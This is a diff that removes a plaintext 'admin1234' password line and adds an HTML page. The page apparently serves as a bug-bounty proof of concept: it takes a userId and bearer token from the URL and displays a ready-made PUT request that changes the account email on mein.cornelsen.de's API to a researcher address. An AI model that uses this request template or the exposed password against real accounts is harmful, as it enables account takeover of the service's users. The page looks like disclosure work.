@@ -1,1 +1,81 @@
-password =admin1234
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Display PUT Request</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        pre {
+            background-color: #f0f0f0;
+            border: 1px solid #ccc;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        h1 {
+            color: #d9534f;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Generated PUT Request</h1>
+    <pre id="http-request">
+        <!-- The PUT request will be displayed here -->
+    </pre>
+
+    <script>
+        // Function to get URL parameters
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+            const results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Extract userId and token from the URL
+        const userId = getParameterByName('userId');
+        const token = getParameterByName('token');
+
+        // Check if both parameters are present
+        if (userId && token) {
+            // Create the PUT request string
+            const putRequest = `
+PUT /v1/user/${userId}/email HTTP/2
+Host: api.mein.cornelsen.de
+Content-Length: 72
+Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
+Accept: application/json
+Sec-Ch-Ua-Platform: "Windows"
+Sec-Ch-Ua-Mobile: ?0
+Authorization: Bearer ${token}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Content-Type: application/json
+Origin: https://mein.cornelsen.de
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://mein.cornelsen.de/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9,ar;q=0.8
+Priority: u=1, i
+
+{"email":"bogeyaden-336@intigriti.me","isNewsletterApprovalGiven":false}
+            `;
+
+            // Display the generated PUT request in the <pre> tag
+            document.getElementById('http-request').textContent = putRequest;
+        } else {
+            document.getElementById('http-request').textContent = 'Missing userId or token in the URL parameters.';
+        }
+    </script>
+
+</body>
+</html>
